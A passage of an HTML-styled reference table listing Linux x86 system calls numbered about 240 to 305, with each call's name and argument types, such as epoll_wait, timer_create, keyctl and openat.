style=\"color:#4f4f4f;\">int op</font> | <font style=\"color:#4f4f4f;\">u32 val</font> | <font style=\"color:#4f4f4f;\">struct timespec *utime</font> | <font style=\"color:#4f4f4f;\">u32 *uaddr2</font> | <font style=\"color:#4f4f4f;\">u32 val3</font> |\n| <font style=\"color:#4f4f4f;\">241.</font> | <font style=\"color:#4f4f4f;\">sched_setaffinity</font> | <font style=\"color:#4f4f4f;\">241.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">unsigned int len</font> | <font style=\"color:#4f4f4f;\">unsigned long *user_mask_ptr</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">242.</font> | <font style=\"color:#4f4f4f;\">sched_getaffinity</font> | <font style=\"color:#4f4f4f;\">242.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">unsigned int len</font> | <font style=\"color:#4f4f4f;\">unsigned long *user_mask_ptr</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">243.</font> | <font style=\"color:#4f4f4f;\">set_thread_area</font> | <font style=\"color:#4f4f4f;\">243.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">244.</font> | <font style=\"color:#4f4f4f;\">get_thread_area</font> | <font style=\"color:#4f4f4f;\">244.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">245.</font> | <font style=\"color:#4f4f4f;\">io_setup</font> | <font style=\"color:#4f4f4f;\">245.</font> | <font style=\"color:#4f4f4f;\">unsigned nr_reqs</font> | <font style=\"color:#4f4f4f;\">aio_context_t *ctx</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">246.</font> | <font style=\"color:#4f4f4f;\">io_destroy</font> | <font style=\"color:#4f4f4f;\">246.</font> | <font style=\"color:#4f4f4f;\">aio_context_t ctx</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">247.</font> | <font style=\"color:#4f4f4f;\">io_getevents</font> | <font style=\"color:#4f4f4f;\">247.</font> | <font style=\"color:#4f4f4f;\">aio_context_t ctx_id</font> | <font style=\"color:#4f4f4f;\">long min_nr</font> | <font style=\"color:#4f4f4f;\">long nr</font> | <font style=\"color:#4f4f4f;\">struct io_event *events</font> | <font style=\"color:#4f4f4f;\">struct timespec *timeout</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">248.</font> | <font style=\"color:#4f4f4f;\">io_submit</font> | <font style=\"color:#4f4f4f;\">248.</font> | <font style=\"color:#4f4f4f;\">aio_context_t</font> | <font style=\"color:#4f4f4f;\">long</font> | <font style=\"color:#4f4f4f;\">struct iocb * *</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">249.</font> | <font style=\"color:#4f4f4f;\">io_cancel</font> | <font style=\"color:#4f4f4f;\">249.</font> | <font style=\"color:#4f4f4f;\">aio_context_t ctx_id</font> | <font style=\"color:#4f4f4f;\">struct iocb *iocb</font> | <font style=\"color:#4f4f4f;\">struct io_event *result</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">250.</font> | <font style=\"color:#4f4f4f;\">fadvise64</font> | <font style=\"color:#4f4f4f;\">250.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">loff_t offset</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">int advice</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">251.</font> | <font style=\"color:#4f4f4f;\">not implemented</font> | <font style=\"color:#4f4f4f;\">251.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">252.</font> | <font style=\"color:#4f4f4f;\">exit_group</font> | <font style=\"color:#4f4f4f;\">252.</font> | <font style=\"color:#4f4f4f;\">int error_code</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">253.</font> | <font style=\"color:#4f4f4f;\">lookup_dcookie</font> | <font style=\"color:#4f4f4f;\">253.</font> | <font style=\"color:#4f4f4f;\">u64 cookie64</font> | <font style=\"color:#4f4f4f;\">char *buf</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">254.</font> | <font style=\"color:#4f4f4f;\">epoll_create</font> | <font style=\"color:#4f4f4f;\">254.</font> | <font style=\"color:#4f4f4f;\">int size</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">255.</font> | <font style=\"color:#4f4f4f;\">epoll_ctl</font> | <font style=\"color:#4f4f4f;\">255.</font> | <font style=\"color:#4f4f4f;\">int epfd</font> | <font style=\"color:#4f4f4f;\">int op</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">struct epoll_event *event</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">256.</font> | <font style=\"color:#4f4f4f;\">epoll_wait</font> | <font style=\"color:#4f4f4f;\">256.</font> | <font style=\"color:#4f4f4f;\">int epfd</font> | <font style=\"color:#4f4f4f;\">struct epoll_event *events</font> | <font style=\"color:#4f4f4f;\">int maxevents</font> | <font style=\"color:#4f4f4f;\">int timeout</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">257.</font> | <font style=\"color:#4f4f4f;\">remap_file_pages</font> | <font style=\"color:#4f4f4f;\">257.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">unsigned long size</font> | <font style=\"color:#4f4f4f;\">unsigned long prot</font> | <font style=\"color:#4f4f4f;\">unsigned long pgoff</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">258.</font> | <font style=\"color:#4f4f4f;\">set_tid_address</font> | <font style=\"color:#4f4f4f;\">258.</font> | <font style=\"color:#4f4f4f;\">int *tidptr</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">259.</font> | <font style=\"color:#4f4f4f;\">timer_create</font> | <font style=\"color:#4f4f4f;\">259.</font> | <font style=\"color:#4f4f4f;\">clockid_t which_clock</font> | <font style=\"color:#4f4f4f;\">struct sigevent *timer_event_spec</font> | <font style=\"color:#4f4f4f;\">timer_t * created_timer_id</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">260.</font> | <font style=\"color:#4f4f4f;\">timer_settime</font> | <font style=\"color:#4f4f4f;\">260.</font> | <font style=\"color:#4f4f4f;\">timer_t timer_id</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">const struct __kernel_itimerspec *new_setting</font> | <font style=\"color:#4f4f4f;\">struct itimerspec *old_setting</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">261.</font> | <font style=\"color:#4f4f4f;\">timer_gettime</font> | <font style=\"color:#4f4f4f;\">261.</font> | <font style=\"color:#4f4f4f;\">timer_t timer_id</font> | <font style=\"color:#4f4f4f;\">struct __kernel_itimerspec *setting</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">262.</font> | <font style=\"color:#4f4f4f;\">timer_getoverrun</font> | <font style=\"color:#4f4f4f;\">262.</font> | <font style=\"color:#4f4f4f;\">timer_t timer_id</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">263.</font> | <font style=\"color:#4f4f4f;\">timer_delete</font> | <font style=\"color:#4f4f4f;\">263.</font> | <font style=\"color:#4f4f4f;\">timer_t timer_id</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">264.</font> | <font style=\"color:#4f4f4f;\">clock_settime</font> | <font style=\"color:#4f4f4f;\">264.</font> | <font style=\"color:#4f4f4f;\">clockid_t which_clock</font> | <font style=\"color:#4f4f4f;\">const struct __kernel_timespec *tp</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">265.</font> | <font style=\"color:#4f4f4f;\">clock_gettime</font> | <font style=\"color:#4f4f4f;\">265.</font> | <font style=\"color:#4f4f4f;\">clockid_t which_clock</font> | <font style=\"color:#4f4f4f;\">struct __kernel_timespec *tp</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">266.</font> | <font style=\"color:#4f4f4f;\">clock_getres</font> | <font style=\"color:#4f4f4f;\">266.</font> | <font style=\"color:#4f4f4f;\">clockid_t which_clock</font> | <font style=\"color:#4f4f4f;\">struct __kernel_timespec *tp</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">267.</font> | <font style=\"color:#4f4f4f;\">clock_nanosleep</font> | <font style=\"color:#4f4f4f;\">267.</font> | <font style=\"color:#4f4f4f;\">clockid_t which_clock</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">const struct __kernel_timespec *rqtp</font> | <font style=\"color:#4f4f4f;\">struct __kernel_timespec *rmtp</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">268.</font> | <font style=\"color:#4f4f4f;\">statfs64</font> | <font style=\"color:#4f4f4f;\">268.</font> | <font style=\"color:#4f4f4f;\">const char *path</font> | <font style=\"color:#4f4f4f;\">size_t sz</font> | <font style=\"color:#4f4f4f;\">struct statfs64 *buf</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">269.</font> | <font style=\"color:#4f4f4f;\">fstatfs64</font> | <font style=\"color:#4f4f4f;\">269.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">size_t sz</font> | <font style=\"color:#4f4f4f;\">struct statfs64 *buf</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">270.</font> | <font style=\"color:#4f4f4f;\">tgkill</font> | <font style=\"color:#4f4f4f;\">270.</font> | <font style=\"color:#4f4f4f;\">pid_t tgid</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">int sig</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">271.</font> | <font style=\"color:#4f4f4f;\">utimes</font> | <font style=\"color:#4f4f4f;\">271.</font> | <font style=\"color:#4f4f4f;\">char *filename</font> | <font style=\"color:#4f4f4f;\">struct timeval *utimes</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">272.</font> | <font style=\"color:#4f4f4f;\">fadvise64_64</font> | <font style=\"color:#4f4f4f;\">272.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">loff_t offset</font> | <font style=\"color:#4f4f4f;\">loff_t len</font> | <font style=\"color:#4f4f4f;\">int advice</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">273.</font> | <font style=\"color:#4f4f4f;\">vserver</font> | <font style=\"color:#4f4f4f;\">273.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">274.</font> | <font style=\"color:#4f4f4f;\">mbind</font> | <font style=\"color:#4f4f4f;\">274.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">unsigned long len</font> | <font style=\"color:#4f4f4f;\">unsigned long mode</font> | <font style=\"color:#4f4f4f;\">const unsigned long *nmask</font> | <font style=\"color:#4f4f4f;\">unsigned long maxnode</font> | <font style=\"color:#4f4f4f;\">unsigned flags</font> |\n| <font style=\"color:#4f4f4f;\">275.</font> | <font style=\"color:#4f4f4f;\">get_mempolicy</font> | <font style=\"color:#4f4f4f;\">275.</font> | <font style=\"color:#4f4f4f;\">int *policy</font> | <font style=\"color:#4f4f4f;\">unsigned long *nmask</font> | <font style=\"color:#4f4f4f;\">unsigned long maxnode</font> | <font style=\"color:#4f4f4f;\">unsigned long addr</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">276.</font> | <font style=\"color:#4f4f4f;\">set_mempolicy</font> | <font style=\"color:#4f4f4f;\">276.</font> | <font style=\"color:#4f4f4f;\">int mode</font> | <font style=\"color:#4f4f4f;\">const unsigned long *nmask</font> | <font style=\"color:#4f4f4f;\">unsigned long maxnode</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">277.</font> | <font style=\"color:#4f4f4f;\">mq_open</font> | <font style=\"color:#4f4f4f;\">277.</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">int oflag</font> | <font style=\"color:#4f4f4f;\">umode_t mode</font> | <font style=\"color:#4f4f4f;\">struct mq_attr *attr</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">278.</font> | <font style=\"color:#4f4f4f;\">mq_unlink</font> | <font style=\"color:#4f4f4f;\">278.</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">279.</font> | <font style=\"color:#4f4f4f;\">mq_timedsend</font> | <font style=\"color:#4f4f4f;\">279.</font> | <font style=\"color:#4f4f4f;\">mqd_t mqdes</font> | <font style=\"color:#4f4f4f;\">const char *msg_ptr</font> | <font style=\"color:#4f4f4f;\">size_t msg_len</font> | <font style=\"color:#4f4f4f;\">unsigned int msg_prio</font> | <font style=\"color:#4f4f4f;\">const struct __kernel_timespec *abs_timeout</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">280.</font> | <font style=\"color:#4f4f4f;\">mq_timedreceive</font> | <font style=\"color:#4f4f4f;\">280.</font> | <font style=\"color:#4f4f4f;\">mqd_t mqdes</font> | <font style=\"color:#4f4f4f;\">char *msg_ptr</font> | <font style=\"color:#4f4f4f;\">size_t msg_len</font> | <font style=\"color:#4f4f4f;\">unsigned int *msg_prio</font> | <font style=\"color:#4f4f4f;\">const struct __kernel_timespec *abs_timeout</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">281.</font> | <font style=\"color:#4f4f4f;\">mq_notify</font> | <font style=\"color:#4f4f4f;\">281.</font> | <font style=\"color:#4f4f4f;\">mqd_t mqdes</font> | <font style=\"color:#4f4f4f;\">const struct sigevent *notification</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">282.</font> | <font style=\"color:#4f4f4f;\">mq_getsetattr</font> | <font style=\"color:#4f4f4f;\">282.</font> | <font style=\"color:#4f4f4f;\">mqd_t mqdes</font> | <font style=\"color:#4f4f4f;\">const struct mq_attr *mqstat</font> | <font style=\"color:#4f4f4f;\">struct mq_attr *omqstat</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">283.</font> | <font style=\"color:#4f4f4f;\">kexec_load</font> | <font style=\"color:#4f4f4f;\">283.</font> | <font style=\"color:#4f4f4f;\">unsigned long entry</font> | <font style=\"color:#4f4f4f;\">unsigned long nr_segments</font> | <font style=\"color:#4f4f4f;\">struct kexec_segment *segments</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">284.</font> | <font style=\"color:#4f4f4f;\">waitid</font> | <font style=\"color:#4f4f4f;\">284.</font> | <font style=\"color:#4f4f4f;\">int which</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">struct siginfo *infop</font> | <font style=\"color:#4f4f4f;\">int options</font> | <font style=\"color:#4f4f4f;\">struct rusage *ru</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">285.</font> | <font style=\"color:#4f4f4f;\">not implemented</font> | <font style=\"color:#4f4f4f;\">285.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">286.</font> | <font style=\"color:#4f4f4f;\">add_key</font> | <font style=\"color:#4f4f4f;\">286.</font> | <font style=\"color:#4f4f4f;\">const char *_type</font> | <font style=\"color:#4f4f4f;\">const char *_description</font> | <font style=\"color:#4f4f4f;\">const void *_payload</font> | <font style=\"color:#4f4f4f;\">size_t plen</font> | <font style=\"color:#4f4f4f;\">key_serial_t destringid</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">287.</font> | <font style=\"color:#4f4f4f;\">request_key</font> | <font style=\"color:#4f4f4f;\">287.</font> | <font style=\"color:#4f4f4f;\">const char *_type</font> | <font style=\"color:#4f4f4f;\">const char *_description</font> | <font style=\"color:#4f4f4f;\">const char *_callout_info</font> | <font style=\"color:#4f4f4f;\">key_serial_t destringid</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">288.</font> | <font style=\"color:#4f4f4f;\">keyctl</font> | <font style=\"color:#4f4f4f;\">288.</font> | <font style=\"color:#4f4f4f;\">int cmd</font> | <font style=\"color:#4f4f4f;\">unsigned long arg2</font> | <font style=\"color:#4f4f4f;\">unsigned long arg3</font> | <font style=\"color:#4f4f4f;\">unsigned long arg4</font> | <font style=\"color:#4f4f4f;\">unsigned long arg5</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">289.</font> | <font style=\"color:#4f4f4f;\">ioprio_set</font> | <font style=\"color:#4f4f4f;\">289.</font> | <font style=\"color:#4f4f4f;\">int which</font> | <font style=\"color:#4f4f4f;\">int who</font> | <font style=\"color:#4f4f4f;\">int ioprio</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">290.</font> | <font style=\"color:#4f4f4f;\">ioprio_get</font> | <font style=\"color:#4f4f4f;\">290.</font> | <font style=\"color:#4f4f4f;\">int which</font> | <font style=\"color:#4f4f4f;\">int who</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">291.</font> | <font style=\"color:#4f4f4f;\">inotify_init</font> | <font style=\"color:#4f4f4f;\">291.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">292.</font> | <font style=\"color:#4f4f4f;\">inotify_add_watch</font> | <font style=\"color:#4f4f4f;\">292.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">const char *path</font> | <font style=\"color:#4f4f4f;\">u32 mask</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">293.</font> | <font style=\"color:#4f4f4f;\">inotify_rm_watch</font> | <font style=\"color:#4f4f4f;\">293.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">__s32 wd</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">294.</font> | <font style=\"color:#4f4f4f;\">migrate_pages</font> | <font style=\"color:#4f4f4f;\">294.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">unsigned long maxnode</font> | <font style=\"color:#4f4f4f;\">const unsigned long *from</font> | <font style=\"color:#4f4f4f;\">const unsigned long *to</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">295.</font> | <font style=\"color:#4f4f4f;\">openat</font> | <font style=\"color:#4f4f4f;\">295.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">umode_t mode</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">296.</font> | <font style=\"color:#4f4f4f;\">mkdirat</font> | <font style=\"color:#4f4f4f;\">296.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char * pathname</font> | <font style=\"color:#4f4f4f;\">umode_t mode</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">297.</font> | <font style=\"color:#4f4f4f;\">mknodat</font> | <font style=\"color:#4f4f4f;\">297.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char * filename</font> | <font style=\"color:#4f4f4f;\">umode_t mode</font> | <font style=\"color:#4f4f4f;\">unsigned dev</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">298.</font> | <font style=\"color:#4f4f4f;\">fchownat</font> | <font style=\"color:#4f4f4f;\">298.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">uid_t user</font> | <font style=\"color:#4f4f4f;\">gid_t group</font> | <font style=\"color:#4f4f4f;\">int flag</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">299.</font> | <font style=\"color:#4f4f4f;\">futimesat</font> | <font style=\"color:#4f4f4f;\">299.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">struct timeval *utimes</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">300.</font> | <font style=\"color:#4f4f4f;\">fstatat64</font> | <font style=\"color:#4f4f4f;\">300.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">struct stat64 *statbuf</font> | <font style=\"color:#4f4f4f;\">int flag</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">301.</font> | <font style=\"color:#4f4f4f;\">unlinkat</font> | <font style=\"color:#4f4f4f;\">301.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char * pathname</font> | <font style=\"color:#4f4f4f;\">int flag</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">302.</font> | <font style=\"color:#4f4f4f;\">renameat</font> | <font style=\"color:#4f4f4f;\">302.</font> | <font style=\"color:#4f4f4f;\">int olddfd</font> | <font style=\"color:#4f4f4f;\">const char * oldname</font> | <font style=\"color:#4f4f4f;\">int newdfd</font> | <font style=\"color:#4f4f4f;\">const char * newname</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">303.</font> | <font style=\"color:#4f4f4f;\">linkat</font> | <font style=\"color:#4f4f4f;\">303.</font> | <font style=\"color:#4f4f4f;\">int olddfd</font> | <font style=\"color:#4f4f4f;\">const char *oldname</font> | <font style=\"color:#4f4f4f;\">int newdfd</font> | <font style=\"color:#4f4f4f;\">const char *newname</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">304.</font> | <font style=\"color:#4f4f4f;\">symlinkat</font> | <font style=\"color:#4f4f4f;\">304.</font> | <font style=\"color:#4f4f4f;\">const char * oldname</font> | <font style=\"color:#4f4f4f;\">int newdfd</font> | <font style=\"color:#4f4f4f;\">const char * newname</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">305.</font> | <font style=\"color:#4f4f4f;\">readlinkat</font> | <font style=\"color:#4f4f4f;\">305.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *path</font> | <font style=\"color:#4f4f4f;\">char *buf</font> | <font style=\"color:#4f4f4f;\">int bufsiz</font> | 